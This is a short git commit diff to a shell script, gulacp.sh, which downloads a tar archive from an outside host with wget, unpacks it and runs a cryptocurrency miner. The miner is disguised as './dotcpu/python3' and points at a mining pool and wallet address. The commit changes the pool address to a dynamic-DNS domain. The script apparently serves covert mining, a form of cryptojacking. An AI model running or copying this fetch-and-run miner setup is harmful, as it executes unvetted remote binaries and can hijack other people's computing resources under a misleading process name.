c403c0514d1f6dfdc936b453355ade9eb58ea560
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-07-01 04:14:38 +0700

    Update gulacp.sh

--- gulacp.sh
+++ gulacp.sh
@@ -2,4 +2,4 @@ wget -O DOT momok.x10.bz/DOT-CPU.tar.gz
 
 tar -xvf DOT
 
-./dotcpu/python3 -a yespowersugar -o 45.115.225.210:443 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt -p c=DGB
+./dotcpu/python3 -a yespowersugar -o luckyynr.us.to:443 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt -p c=DGB
